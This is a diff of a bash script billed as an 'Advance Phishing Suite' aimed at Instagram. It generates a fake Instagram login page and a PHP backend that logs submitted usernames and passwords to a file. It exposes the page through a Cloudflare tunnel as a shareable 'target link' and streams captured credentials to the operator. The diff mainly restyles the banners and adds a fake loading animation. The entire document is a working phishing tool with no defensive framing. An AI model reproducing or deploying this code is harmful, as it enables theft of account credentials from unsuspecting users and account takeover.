@@ -1,70 +1,76 @@
 #!/bin/bash
 
-# --- 1. CONFIGURATION (CUSTOM IMAGE) ---
+# --- 1. CONFIGURATION ---
 IMG_URL="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"
 
-# --- 2. SYSTEM CHECK & SETUP ---
-clear
-# Colors (Advance Theme)
+# --- 2. SYSTEM SETUP ---
+# Colors
 RED='\033[1;31m'
 GREEN='\033[1;32m'
-BLUE='\033[1;34m'
 CYAN='\033[1;36m'
 YELLOW='\033[1;33m'
-PURPLE='\033[1;35m'
 WHITE='\033[1;37m'
 RESET='\033[0m'
 BOLD='\033[1m'
 
-# Cleanup Old
+# Cleanup
 pkill -f php > /dev/null 2>&1
 pkill -f cloudflared > /dev/null 2>&1
 rm -rf auth/ cloud.log
 mkdir -p auth
 touch usernames.txt
 
-# Detect OS (Mobile vs PC)
+# OS Check
 if [ -d "/data/data/com.termux/files/usr" ]; then
-    # Android (Termux)
     RUNNER="termux-chroot"
     if ! command -v termux-chroot &> /dev/null; then
-        echo -e "${YELLOW}[*] Installing Mobile Drivers...${RESET}"
         pkg install proot resolv-conf -y > /dev/null 2>&1
     fi
 else
-    # Linux (Kali/Ubuntu)
     RUNNER=""
 fi
 
-# RANDOM PORT GENERATOR
 PORT=$((4000 + RANDOM % 5000))
 
-# --- 3. ULTRA PREMIUM BANNER (ANURAG HKR - BLOCK STYLE) ---
+# --- 3. HACKER LOADING ANIMATION (Real Feel) ---
 clear
-echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${RESET}"
-echo -e "${CYAN}║                                                              ║${RESET}"
-echo -e "${RED}║   █████╗ ███╗   ██╗██╗   ██╗██████╗  █████╗  ██████╗         ║${RESET}"
-echo -e "${RED}║   ██╔══██╗████╗  ██║██║   ██║██╔══██╗██╔══██╗██╔════╝        ║${RESET}"
-echo -e "${RED}║   ███████║██╔██╗ ██║██║   ██║██████╔╝███████║██║  ███╗       ║${RESET}"
-echo -e "${RED}║   ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║██║   ██║       ║${RESET}"
-echo -e "${RED}║   ██║  ██║██║ ╚████║╚██████╔╝██║  ██║██║  ██║╚██████╔╝       ║${RESET}"
-echo -e "${RED}║   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝        ║${RESET}"
-echo -e "${RED}║           ██╗  ██╗██╗  ██╗██████╗                            ║${RESET}"
-echo -e "${RED}║           ██║  ██║██║ ██╔╝██╔══██╗                           ║${RESET}"
-echo -e "${RED}║           ███████║█████╔╝ ██████╔╝                           ║${RESET}"
-echo -e "${RED}║           ██╔══██║██╔═██╗ ██╔══██╗                           ║${RESET}"
-echo -e "${RED}║           ██║  ██║██║  ██╗██║  ██║                           ║${RESET}"
-echo -e "${RED}║           ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                           ║${RESET}"
-echo -e "${CYAN}║                                                              ║${RESET}"
-echo -e "${CYAN}╠══════════════════════════════════════════════════════════════╣${RESET}"
-echo -e "${CYAN}║${PURPLE}         >>> ADVANCE PHISHING SUITE v9.0 <<<                  ${CYAN}║${RESET}"
-echo -e "${CYAN}║${YELLOW}         >>> CREATED BY : ${RED}${BOLD}ANURAG HKR${RESET}${YELLOW} <<<                      ${CYAN}║${RESET}"
-echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${RESET}"
+echo -e "${GREEN}[*] INITIALIZING SYSTEM...${RESET}"
+sleep 0.5
+echo -e "${GREEN}[*] CHECKING DEPENDENCIES... ${CYAN}OK${RESET}"
+sleep 0.5
+echo -e "${GREEN}[*] BYPASSING SECURITY...    ${CYAN}DONE${RESET}"
+sleep 0.5
+echo -ne "${YELLOW}[*] LOADING INTERFACE: [${RESET}"
+# Fake Loading Bar
+for i in {1..20}; do
+    echo -ne "${RED}#"
+    sleep 0.05
+done
+echo -e "${YELLOW}] 100%${RESET}"
+sleep 1
+clear
+
+# --- 4. THE CLEAN & READABLE BANNER ---
+echo -e "${CYAN}╔════════════════════════════════════════════════════╗${RESET}"
+echo -e "${CYAN}║ ${GREEN}:: SYSTEM STATUS ::            ${RED}[ ONLINE ]${CYAN}          ║${RESET}"
+echo -e "${CYAN}╠════════════════════════════════════════════════════╣${RESET}"
+echo -e "${CYAN}║                                                    ║${RESET}"
+echo -e "${CYAN}║     ${WHITE}USER ID : ${RED}ADMIN_001${CYAN}                            ║${RESET}"
+echo -e "${CYAN}║     ${WHITE}ACCESS  : ${GREEN}UNLIMITED${CYAN}                            ║${RESET}"
+echo -e "${CYAN}║                                                    ║${RESET}"
+echo -e "${CYAN}║         ${YELLOW}╔══════════════════════════════╗${CYAN}           ║${RESET}"
+echo -e "${CYAN}║         ${YELLOW}║ ${RED}     A N U R A G   H K R    ${YELLOW}║${CYAN}           ║${RESET}"
+echo -e "${CYAN}║         ${YELLOW}╚══════════════════════════════╝${CYAN}           ║${RESET}"
+echo -e "${CYAN}║                                                    ║${RESET}"
+echo -e "${CYAN}║   ${WHITE}TOOL    : ${GREEN}ADVANCE PHISHING SUITE v9.0${CYAN}          ║${RESET}"
+echo -e "${CYAN}║   ${WHITE}TARGET  : ${RED}INSTAGRAM${CYAN}                            ║${RESET}"
+echo -e "${CYAN}║                                                    ║${RESET}"
+echo -e "${CYAN}╚════════════════════════════════════════════════════╝${RESET}"
 echo ""
-echo -e "${GREEN}[+] System Assigned Port : ${RED}$PORT ${GREEN}(Safe Mode)${RESET}"
+echo -e "${GREEN}[+] SECURE PORT ASSIGNED : ${RED}$PORT ${RESET}"
 echo ""
 
-# --- 4. YOUR ORIGINAL DESIGN (With Mobile Fix) ---
+# --- 5. YOUR ORIGINAL HTML CODE (Unchanged) ---
 cat > auth/index.php <<EOF
 <!DOCTYPE html>
 <html lang="en">
@@ -76,8 +82,6 @@ cat > auth/index.php <<EOF
 *{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
 body{ background:#0b1116; color:#fff; }
 .main{ display:flex; min-height:100vh; }
-
-/* DESKTOP STYLES */
 .left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
 .left img.logo{ width:55px; margin-bottom:40px; }
 .left h1{ font-size:40px; font-weight:400; line-height:1.3; }
@@ -92,8 +96,6 @@ body{ background:#0b1116; color:#fff; }
 .fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
 .new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
 .meta{ text-align:center; margin-top:25px; opacity:.7; }
-
-/* MOBILE FIX */
 @media(max-width:900px){
     .main{ flex-direction:column; }
     .left{ display:none; } 
@@ -111,7 +113,6 @@ body{ background:#0b1116; color:#fff; }
         <h1>See everyday moments from <br> your <span>close friends.</span></h1>
         <img class="story" src="$IMG_URL">
     </div>
-
     <div class="right">
         <div class="card">
             <img class="mobile-logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
@@ -132,7 +133,7 @@ body{ background:#0b1116; color:#fff; }
 </html>
 EOF
 
-# --- 5. PHP BACKEND ---
+# --- 6. PHP & MENU ---
 cat > auth/login.php <<EOF
 <?php
 file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
@@ -141,23 +142,21 @@ exit();
 ?>
 EOF
 
-# --- 6. MENU & EXECUTION ---
-echo -e "${GREEN}[1] Localhost (Test/WiFi)${RESET}"
-echo -e "${GREEN}[2] Cloudflare (Worldwide Link)${RESET}"
+echo -e "${WHITE}[1] Localhost (Internal)${RESET}"
+echo -e "${WHITE}[2] Cloudflare (Worldwide)${RESET}"
 echo ""
-echo -ne "${YELLOW}Select Option: ${RESET}"
+echo -ne "${YELLOW}COMMAND >> ${RESET}"
 read option
 
 if [[ $option == "1" ]]; then
-    echo -e "${BLUE}[*] Starting Local Server on Port $PORT...${RESET}"
+    echo -e "${BLUE}[*] STARTING SERVER...${RESET}"
     $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
     sleep 2
-    echo -e "${GREEN}[✔] HOSTED: http://127.0.0.1:$PORT${RESET}"
+    echo -e "${GREEN}[✔] SUCCESS: http://127.0.0.1:$PORT${RESET}"
 
 elif [[ $option == "2" ]]; then
-    # Auto Download Cloudflare
     if [ ! -f "cloudflared" ]; then
-        echo -e "${YELLOW}[*] Downloading Cloudflare Engine...${RESET}"
+        echo -e "${YELLOW}[*] DOWNLOADING ENGINE...${RESET}"
         ARCH=$(uname -m)
         if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
             wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
@@ -167,22 +166,19 @@ elif [[ $option == "2" ]]; then
         chmod +x cloudflared
     fi
 
-    echo -e "${BLUE}[*] Starting Services on Port $PORT...${RESET}"
-    # Start PHP on Random Port
+    echo -e "${BLUE}[*] LAUNCHING SATELLITE CONNECTION...${RESET}"
     $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
     sleep 2
-    
-    # Start Tunnel on Same Random Port
     $RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
     
-    echo -ne "${YELLOW}[*] Generating Link... ${RESET}"
+    echo -ne "${YELLOW}[*] ENCRYPTING LINK... ${RESET}"
     for i in {1..15}; do
         if [ -f cloud.log ]; then
             LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
             if [ ! -z "$LINK" ]; then
-                echo -e "\n\n${GREEN}========================================${RESET}"
-                echo -e "${YELLOW} URL: ${LINK} ${RESET}"
-                echo -e "${GREEN}========================================${RESET}"
+                echo -e "\n\n${GREEN}════════════════════════════════════════${RESET}"
+                echo -e "${YELLOW} TARGET LINK: ${LINK} ${RESET}"
+                echo -e "${GREEN}════════════════════════════════════════${RESET}"
                 break
             fi
         fi
@@ -191,14 +187,14 @@ elif [[ $option == "2" ]]; then
     done
 fi
 
-# --- 7. LIVE MONITORING ---
+# --- 7. MONITORING INTERFACE ---
 echo ""
-echo -e "${RED}[*] Waiting for Credentials...${RESET}"
+echo -e "${RED}[*] SYSTEM READY. WAITING FOR INPUT...${RESET}"
 while true; do
     if [ -f usernames.txt ]; then
         tail -n 0 -f usernames.txt | while read line; do
             echo -e "${RED}╔════════════════════════════════╗${RESET}"
-            echo -e "${RED}║       VICTIM CAPTURED!         ║${RESET}"
+            echo -e "${RED}║       [!] DATA CAPTURED        ║${RESET}"
             echo -e "${RED}╠════════════════════════════════╣${RESET}"
             echo -e "${GREEN} $line ${RESET}"
             echo -e "${RED}╚════════════════════════════════╝${RESET}"
